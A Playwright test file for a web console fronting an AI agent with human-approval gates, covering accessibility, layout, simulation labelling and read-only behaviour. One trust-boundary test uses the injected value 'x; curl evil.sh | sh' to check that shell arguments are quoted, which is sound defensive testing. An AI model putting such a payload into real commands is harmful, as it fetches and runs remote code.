import { expect, test, type Page } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
import { fileURLToPath } from "node:url";
import { approveCommand, promoteCommand, rollbackCommand } from "../src/data/commands";

const FIXTURE = fileURLToPath(new URL("./fixtures/bench-mock-result.json", import.meta.url));
const AUDIT = fileURLToPath(new URL("./fixtures/audit-demo-run.json", import.meta.url));
const step = (page: Page, name: string | RegExp) => page.getByRole("button", { name }).click();

async function runToReuse(page: Page) {
  await page.goto("#/console/investigations");
  await step(page, /^Start/);
  await step(page, "Simulate approval");
  await step(page, "Simulate learning a skill");
  await step(page, "Simulate promotion");
  await step(page, "Run on new data");
  await step(page, "Simulate approval of both fixes");
}

test.describe("story", () => {
  test("hero offers the live demo immediately and tells all five acts", async ({ page }) => {
    await page.goto("/#/story");
    await expect(page.getByRole("heading", { level: 1 })).toContainText("Reuse the fix without it.");
    await page.getByRole("link", { name: "Open the console" }).first().click();
    await expect(page).toHaveURL(/#\/console/);
    await page.goto("/#/story");
    for (const n of [1, 2, 3, 4, 5]) await expect(page.locator(`#act-${n}-h`)).toHaveCount(1);
  });

  test("reduced motion renders every act statically", async ({ browser }) => {
    const ctx = await browser.newContext({ reducedMotion: "reduce", baseURL: `http://127.0.0.1:${process.env.PORT ?? 4173}/` });
    const page = await ctx.newPage();
    await page.goto("/#/story");
    await expect(page.getByText("line-total-reconcile").first()).toBeVisible();
    expect(await page.evaluate(() => document.getAnimations().filter((a) => a.playState === "running").length)).toBe(0);
    await ctx.close();
  });
});

test.describe("console workflow (synthetic preview)", () => {
  test("investigate, approve, verify, learn, promote, reuse", async ({ page }) => {
    await runToReuse(page);
    await expect(page.getByText("2 of 2 verified")).toBeVisible();
    const cmp = page.getByRole("region", { name: "Same task, before and after" });
    await expect(cmp.getByText("Synthetic preview")).toBeVisible(); // illustrative numbers are always labelled
  });

  test("nothing is applied before approval; rejecting closes it", async ({ page }) => {
    await page.goto("#/console/investigations");
    await step(page, /^Start/);
    await expect(page.getByText("Waiting for your approval")).toBeVisible();
    await expect(page.getByText("Apply the approved fix")).toHaveCount(0);
    await step(page, "Simulate rejection");
    await expect(page.getByText("No change was made")).toBeVisible();
    await expect(page.getByText("Apply the approved fix")).toHaveCount(0);
  });

  test("model offline escalates instead of guessing", async ({ page }) => {
    await page.goto("#/console/investigations");
    await page.getByLabel(/Model offline/).check();
    await step(page, /^Start/);
    await expect(page.getByRole("status").filter({ hasText: "not responding" })).toBeVisible();
    await expect(page.getByRole("heading", { name: "Escalated to a person" })).toBeVisible();
  });

  test("lost connection is retried idempotently", async ({ page }) => {
    await page.goto("#/console/investigations");
    await page.getByLabel(/Connection drops/).check();
    await step(page, /^Start/);
    await step(page, "Simulate approval");
    await expect(page.getByText("already executed")).toBeVisible();
    await expect(page.getByText("4 of 4 checks passed")).toBeVisible();
  });

  test("verification failure is shown as needing review", async ({ page }) => {
    await page.goto("#/console/investigations");
    await page.getByLabel(/Verification fails/).check();
    await step(page, /^Start/);
    await step(page, "Simulate approval");
    await expect(page.getByRole("alert").filter({ hasText: "Verification failed" })).toBeVisible();
    await expect(page.getByRole("heading", { name: "Needs review" })).toBeVisible();
  });

  test("a waiting approval is unmistakable and the scripted buttons say they approve nothing real", async ({ page }) => {
    await page.goto("#/console/investigations");
    await step(page, /^Start/);
    const panel = page.getByRole("region", { name: "Approve this change?" });
    await expect(panel.getByText("A person is needed")).toBeVisible();
    await expect(panel.getByText("They approve nothing real")).toBeVisible();
    await expect(panel.getByText("untrusted source")).toBeVisible(); // evidence carries its trust mark as words
    await expect(page.getByRole("list", { name: "Agent steps" }).getByText("Needs a person").last()).toBeVisible();
  });

  test("a scripted decision reads as a simulation, with the real host command beside it", async ({ page }) => {
    await page.goto("#/console/investigations");
    await step(page, /^Start/);
    await step(page, "Simulate approval");
    await expect(page.getByText("Simulated approval, by you")).toBeVisible();
    await expect(page.getByText("Approved by you")).toHaveCount(0); // never worded as a person's approval
    const sim = page.getByTestId("simulated-decision");
    await expect(sim).toContainText("Simulated approval");
    await expect(sim).toContainText("python3 -m app approve 7 --by");
    await step(page, "Simulate learning a skill");
    await step(page, "Simulate promotion");
    await expect(page.getByTestId("simulated-decision")).toContainText("Simulated promotion");
    await expect(page.getByText("Promoted by you")).toHaveCount(0);
  });

  test("approval on a real system is a host command, never a browser call", async ({ page }) => {
    await page.goto("#/console/investigations");
    await step(page, /^Start/);
    await expect(page.getByText("python3 -m app approve 7 --by")).toBeVisible();
  });
});

test.describe("data sources", () => {
  test("recorded mode shows a real result file exactly, and labels a mock run", async ({ page }) => {
    await page.goto("#/console/benchmarks");
    await page.locator("label", { hasText: /^Recorded/ }).click();
    await page.locator('input[type="file"]').setInputFiles(FIXTURE);
    await expect(page.getByRole("note")).toContainText("MOCK run");
    await expect(page.getByText("not measured").first()).toBeVisible(); // mock: model_calls null, never 0
  });

  test("live mode without a backend says so and shows no data", async ({ page }) => {
    await page.goto("#/console/overview");
    await page.locator("label", { hasText: /^Live/ }).click();
    await expect(page.getByText("Not connected to a live system")).toBeVisible();
  });

  test("invalid recorded file is rejected with a reason", async ({ page }) => {
    await page.goto("#/console/benchmarks");
    await page.locator('input[type="file"]').setInputFiles({ name: "x.json", mimeType: "application/json", buffer: Buffer.from('{"nope": 1}') });
    await expect(page.getByRole("alert")).toContainText("not a bench result.json");
  });
});

test.describe("navigation, keyboard, layout, accessibility", () => {
  test("every console section renders", async ({ page }) => {
    for (const [section, heading] of [["overview", /decision|No open|Ready/], ["skills", "Skills"], ["history", "Execution history"], ["benchmarks", "Benchmarks"], ["system", "System"]] as const) {
      await page.goto(`#/console/${section}`);
      await expect(page.getByRole("heading", { level: 1 }).first()).toContainText(heading);
    }
  });

  test("skip link and visible focus", async ({ page }) => {
    await page.goto("/#/story");
    await page.keyboard.press("Tab");
    await expect(page.getByRole("link", { name: "Skip to content" })).toBeFocused();
    await page.keyboard.press("Tab");
    const outline = await page.evaluate(() => getComputedStyle(document.activeElement!).outlineStyle);
    expect(outline).not.toBe("none");
  });

  test("phone: every section tab is on screen, history is stacked rows, targets are 44px", async ({ browser }) => {
    const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, baseURL: `http://127.0.0.1:${process.env.PORT ?? 4173}/` });
    const page = await ctx.newPage();
    await page.goto("#/console/history");
    for (const name of ["Overview", "Investigations", "Skills", "History", "Benchmarks", "System"]) {
      const box = await page.getByRole("navigation", { name: "Console" }).getByRole("link", { name }).boundingBox();
      expect(box, name).not.toBeNull();
      expect(box!.x + box!.width, `${name} inside the viewport`).toBeLessThanOrEqual(390);
      expect(box!.height, `${name} target height`).toBeGreaterThanOrEqual(44);
    }
    await expect(page.getByRole("list", { name: "Past runs, newest first" })).toBeVisible();
    await expect(page.getByRole("table", { name: /Past runs/ })).toBeHidden();
    const row = page.getByRole("list", { name: "Past runs, newest first" }).getByRole("listitem").first();
    expect((await row.boundingBox())!.width).toBeGreaterThan(300); // the run name is not squeezed into a letter-wide column
    await ctx.close();
  });

  for (const width of [390, 768]) {
    test(`no horizontal overflow at ${width}px`, async ({ browser }) => {
      const page = await browser.newPage({ viewport: { width, height: 800 }, baseURL: `http://127.0.0.1:${process.env.PORT ?? 4173}/` });
      for (const path of ["", "#/console/investigations", "#/console/skills", "#/console/history", "#/console/system"]) {
        await page.goto(path || "/");
        await page.waitForTimeout(300);
        const over = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
        expect(over, `overflow on ${path || "story"}`).toBeLessThanOrEqual(0);
      }
      await page.close();
    });
  }

  for (const path of ["/", "#/console/overview", "#/console/investigations", "#/console/skills", "#/console/history", "#/console/system"]) {
    test(`axe: no serious or critical violations on ${path}`, async ({ page }) => {
      await page.goto(path);
      // evaluate the settled page: during the hero's 2.5 s load sequence text is mid-fade (partial opacity),
      // which axe would score as low contrast although the resting colours pass (scripts/contrast.mjs)
      await page.waitForTimeout(path === "/" ? 3200 : 600);
      const r = await new AxeBuilder({ page }).analyze();
      const bad = r.violations.filter((v) => v.impact === "serious" || v.impact === "critical");
      expect(bad.map((v) => `${v.id}: ${v.nodes.length} (${v.nodes[0]?.target})`)).toEqual([]);
    });
  }
});

test.describe("presenter and product variants", () => {
  test("presenter: keyboard through seven beats, notes toggle, provenance on every beat", async ({ page }) => {
    await page.goto("#/demo/pitch");
    await expect(page.getByText("1 of 7", { exact: true })).toBeVisible();
    for (let k = 2; k <= 7; k++) {
      await page.keyboard.press("ArrowRight");
      await expect(page.getByText(`${k} of 7`, { exact: true })).toBeVisible();
    }
    await expect(page.getByRole("link", { name: "Open the console" })).toBeVisible();
    await page.keyboard.press("n");
    await expect(page.getByRole("note")).toContainText("Notes:");
    await page.keyboard.press("ArrowLeft");
    await expect(page.getByText("6 of 7", { exact: true })).toBeVisible();
    await expect(page.getByText("Example values").first()).toBeVisible(); // the reuse beat is labelled
  });

  test("OnCall variant changes wording, not the product", async ({ page }) => {
    await page.goto("?product=oncall#/story");
    await expect(page.getByRole("heading", { level: 1 })).toContainText("Every fix remembered.");
    await page.goto("?product=oncall#/console/investigations");
    await expect(page.getByRole("navigation", { name: "Console" })).toContainText("Incidents");
    await expect(page.getByRole("heading", { name: "Ledger mismatch after deploy 1.4.2" })).toBeVisible();
  });
});

test.describe("live mode against a slow operator API (simulated with request interception)", () => {
  test("stays responsive while waiting, then shows the real payload", async ({ page }) => {
    const empty: Record<string, unknown> = { tasks: { ok: true, tasks: [] }, approvals: { ok: true, pending: [] }, skills: { ok: true, skills: [] } };
    await page.route("**/ui/**", async (route) => {
      const p = new URL(route.request().url()).pathname.replace(/^.*\/ui\//, "");
      if (p === "status") {
        await new Promise((r) => setTimeout(r, 2500)); // busy host: inference running
        return route.fulfill({ status: 200, contentType: "application/json",
          body: JSON.stringify({ inference: { ok: true, model: "nvidia/Qwen3.6-35B-A3B-NVFP4", detail: "served" },
            sandbox: { ok: false, detail: "nemoclaw status exit 1" }, host_service: { ok: true, detail: "401 without token" },
            db: { quick_check: "ok" }, next_actions: ["nothing pending"] }) });
      }
      const body = (p === "events" ? { ok: true, events: [], last_id: 0 } : empty[p] ?? { ok: false, error: { code: "not_found", message: "x" } }) as { ok: boolean };
      return route.fulfill({ status: body.ok ? 200 : 404, contentType: "application/json", body: JSON.stringify(body) });
    });
    await page.goto("#/console/system");
    await page.locator("label", { hasText: /^Live/ }).click();
    await page.getByRole("link", { name: "Skills" }).click(); // navigation works while the request is pending
    // the slow host status doesn't hold the rest of the console hostage: real (empty) data shows at once, and the
    // health pills stay "not connected" until the status itself arrives
    await expect(page.getByRole("heading", { name: "No skills yet" })).toBeVisible();
    await expect(page.getByText("Healthy")).toHaveCount(0);
    await page.getByRole("link", { name: "System" }).click();
    await expect(page.getByText("Down").first()).toBeVisible({ timeout: 10000 }); // the sandbox failure is shown, not hidden
    await expect(page.getByRole("heading", { name: "System" })).toBeVisible();
  });
});


test.describe("trust boundary", () => {
  test("the console never sends anything but GET, across the whole workflow and every source", async ({ page }) => {
    const writes: string[] = [];
    page.on("request", (r) => { if (r.method() !== "GET") writes.push(`${r.method()} ${r.url()}`); });
    await runToReuse(page);
    for (const src of ["Recorded", "Live", "Preview"]) await page.locator("label", { hasText: new RegExp(`^${src}`) }).click();
    for (const sec of ["overview", "skills", "history", "benchmarks", "system"]) await page.goto(`#/console/${sec}`);
    expect(writes).toEqual([]);
  });

  test("a real audit export replays as a labelled recorded run", async ({ page }) => {
    await page.goto("#/console/history");
    await expect(page.getByRole("region", { name: /Replay/ }).getByText("Synthetic preview")).toBeVisible();
    await page.getByLabel(/Load an audit export/).setInputFiles(AUDIT);
    const replay = page.getByRole("region", { name: /Replay/ });
    await expect(replay.getByText("Recorded run")).toBeVisible();
    await replay.getByRole("button", { name: /Play|Replay/ }).click();
    await expect(replay.getByText("Execution refused")).toBeVisible({ timeout: 10000 }); // the real demo's refused attempt
  });

  test("host commands quote anything an agent could have named", () => {
    expect(rollbackCommand("line-total-reconcile")).toBe("python3 -m app skill rollback line-total-reconcile --by <your name>");
    const evil = rollbackCommand("x; curl evil.sh | sh");
    expect(evil).toBe("python3 -m app skill rollback 'x; curl evil.sh | sh' --by <your name>");
    expect(promoteCommand("a'b", 2)).toBe(`python3 -m app skill approve 'a'"'"'b' 2 --by <your name>`);
    expect(approveCommand(7.9, "dana")).toBe("python3 -m app approve 7 --by dana");
  });
});


test.describe("keyboard flow (accessibility review findings)", () => {
  test("skip link focuses main content without changing the route", async ({ page }) => {
    await page.goto("#/console/skills");
    await expect(page.getByRole("heading", { name: "Skills", level: 1 })).toBeVisible(); // lazy route loaded
    await page.keyboard.press("Tab");
    await page.keyboard.press("Enter");
    await expect(page).toHaveURL(/#\/console\/skills/);
    await expect(page.locator("main#main")).toBeFocused();
  });

  test("focus moves to the next thing that needs the person after each action", async ({ page }) => {
    await page.goto("#/console/investigations");
    await page.getByRole("button", { name: /^Start/ }).focus();
    await page.keyboard.press("Enter");
    await expect(page.getByRole("button", { name: "Simulate approval" })).toBeFocused({ timeout: 15000 });
    await page.keyboard.press("Enter");
    await expect(page.getByRole("button", { name: "Simulate learning a skill" })).toBeFocused({ timeout: 15000 });
    await page.keyboard.press("Enter");
    await expect(page.getByRole("button", { name: "Simulate promotion" })).toBeFocused({ timeout: 15000 });
  });
});
